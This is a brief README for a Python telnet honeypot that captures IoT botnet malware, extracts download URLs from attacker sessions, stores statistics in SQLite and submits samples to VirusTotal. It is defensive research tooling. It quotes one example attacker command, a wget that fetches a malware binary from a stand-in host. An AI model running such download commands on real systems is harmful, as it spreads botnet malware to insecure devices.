# Telnet IoT honeypot

'Python telnet honeypot for catching botnet binaries'

This project implements a python telnet server trying to act
as a honeypot for IoT Malware which spreads over horribly
insecure default passwords on telnet servers on the internet.

The script tries to identify download commands
like `wget http://haxx0r.net/malware.bin`, extracts the URLs
and tries to download and indentify the malware-binaries.

Statistics of the downloaded binaries and corresponding
Urls/Telnet connections may be created via the generated
SQLite database.

All binaries are also uploaded to virustotal.com, if not
already present.

## Images

![Screenshot 1](images/screen1.png)

![Screenshot 2](images/screen2.png)

![Screenshot 3](images/screen3.png)
